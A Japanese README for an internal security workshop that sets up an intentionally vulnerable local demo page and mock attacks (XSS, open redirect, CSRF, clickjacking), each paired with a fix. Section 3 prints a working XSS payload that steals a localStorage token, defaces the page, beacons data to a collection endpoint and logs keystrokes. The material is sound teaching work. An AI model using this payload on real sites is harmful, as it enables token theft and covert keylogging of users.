# 社内セキュリティ勉強会用 模擬マルウェア＆脆弱デモ

> **これは何？**
> 「本番サイトには脆弱性がない（セキュリティレビュー済み）」ことを前提に、
> *脆弱性があったらどう壊されるか* を体内で再現するための教育用モックです。
> 意図的に脆弱にしたデモページ 1 枚と、それを攻撃する模擬マルウェア（ペイロード）を収録します。
>
> **本番コード（`app/`, `src/`, `worker/`, `public/`）には一切影響しません。**
> `public/` 配下に置いていないため、GitHub Pages のビルド出力にも含まれません。

---

## 1. セットアップ（2 コマンド）

```bash
# 端末1: 攻撃者サーバ（脆弱ページもここから配信。Ctrl+C で終了）
node examples/security-workshop/attack-server.mjs

# 端末2（別プロンプト）: 攻撃URLの一覧を出力
node examples/security-workshop/build-links.mjs
```

表示される URL をブラウザで開いて演習を進めます。
すべて `127.0.0.1` 上で完結し、外部ネットワークへの通信はありません。

---

## 2. デモの位置づけ

| | 本番サイト（ShibuyaScene） | このデモ |
|---|---|---|
| 脆弱性 | なし（レビュー済み） | **意図的に多数** |
| 目的 | 見せ合い・公開 | 勉強会での「攻撃の再現」 |
| 収録場所 | `app/`, `public/` | `examples/security-workshop/`（配信されない） |

> ⚠ 演習後はこのブランチをマージせず削除してください（README 最後の「後片付け」参照）。
> 「マルウェア」といっても実際のウイルスではなく、**XSS/フィッシング等の攻撃コード（ペイロード）のモック**です。

---

## 3. 演習（README の順に進めます）

| # | 脆弱性 | 攻撃の流れ | 教訓 |
|---|--------|-----------|------|
| 1 | 反射型XSS（`?q=`） | 検索窓/URL に `<img src=x onerror=...>` を注入 → トークン窃取・画面改ざん・キーロガー | `innerHTML` への生連結は禁止。`<script>` は動かないが `onerror` は動く |
| 2 | DOM XSS（`#profile=`） | ハッシュ経由でペイロード送信（サーバログに残らない） | フラグメントも「信頼できない入力」 |
| 3 | localStorage トークン保存 | XSS 1 回で全トークン流出 | トークンは `HttpOnly; Secure; SameSite` Cookie で |
| 4 | オープンリダイレクト（`?next=//…`） | `//` 始まりで検証をすり抜け、偽ログインへ誘導 | プロトコル相対 URL まで検証する。本番 `chatgpt-auth.ts` の実装が模範 |
| 5 | CSRF（GET ログアウト） | 何もしていないのに他人の URL を踏むだけで状態が変わる | 状態変更は POST + CSRF トークン |
| 6 | クリックジャッキング | 透明 iframe でクリックを奪う | `X-Frame-Options` / `frame-ancestors` ヘッダ |

### ペイロードの基礎知識（演習1 のコード解説）

攻撃URLに含まれるのは概ね次の処理です（`build-links.mjs` で生成）。

```js
var t = localStorage.getItem('shibuya.demo.token') || '(未ログイン)'; // 1) トークン抽出
var d = document.createElement('div');
d.style.cssText = 'position:fixed;inset:0;background:#5c0000;z-index:9999;...';
d.innerHTML = '<h1>☠ このページは乗っ取られました</h1><p>盗んだトークン: ' + t + '</p>';
document.body.appendChild(d);                                  // 2) 画面改ざん（マルウェアらしさ）
new Image().src = '/collect?d=' + encodeURIComponent('TOKEN:' + t) + '&src=xss'; // 3) 窃取ビーコン
document.addEventListener('keypress', function (e) {           // 4) キーロガー
  new Image().src = '/collect?d=' + encodeURIComponent('KEY:' + e.key) + '&src=keylogger';
}, false);
```

* `<script>` タグは `innerHTML` では実行されない → `<img onerror>` で発火させる（重要ポイント）
* `new Image().src = ...` はレスポンスを読まないので CORS 制約を受けない（画像ビーコン）
* 盗み取ったデータを表示する「攻撃者パネル」側でも HTML エスケープが必要（`attack-server.mjs` の `esc()` 参照）

---

## 4. 脆弱性 → 対策 一覧

| 脆弱性 | このデモでの原因 | 本番で採るべき対策 |
|---|---|---|
| 反射型/DOM XSS | `innerHTML` に未エスケープ連結 | `textContent`、またはエスケープ → CSP 補助 |
| トークン漏えい | localStorage 保存 | `HttpOnly` Cookie、XSLeak 対策 |
| オープンリダイレクト | 無検証の `location.href = next` | `/` 始まり相対パスのみ許可 |
| CSRF | GET による状態変更・トークンなし | POST + トークン、`SameSite=Strict` |
| クリックジャッキング | ヘッダなし | `X-Frame-Options: DENY` ／ CSP `frame-ancestors` |
| リソース読み込みの緩さ | `Access-Control-Allow-Origin: *` の収集サーバ | 必要なオリジンだけ許可 |

---

## 5. 本番リポジトリとの対比（レビュー結果との対応）

セキュリティレビュー（2024-10 実施）で本番コードの類似箇所を確認済み:

* `src/player/diagnostics.mjs` の `innerHTML` はゲームパッド ID や UA など「ブラウザ由来の値」を注入しているが、静的な自サイト限定のため現状は低リスク（※今後データ起点にするならエスケープ必須）
* `src/game/save.mjs` は `sanitise()` で localStorage を検証済み（デモの VULN-3 の逆. 良い実装例）
* `app/chatgpt-auth.ts` の `safeRelativeReturnPath()` はオープンリダイレクトを正しくブロックする（デモの VULN-4 の正解例）
* `/_vinext/image` エンドポイントはパラメータ検証・SVG 無効化・CSP 付きで安全

→ 「デモで壊したものが、本番ではどう直っているか」を比較すると理解が深まります。

---

## 6. 後片付け

```bash
# 端末1 で Ctrl+C（サーバ停止）
git checkout master
git branch -D claude/security-workshop   # 演習用ブランチを削除
```

`examples/security-workshop/` ごとブランチを捨てれば本番には一切影響しません。
（マージして残したい場合は `README` を見て、本番 `public/` には置かないこと）
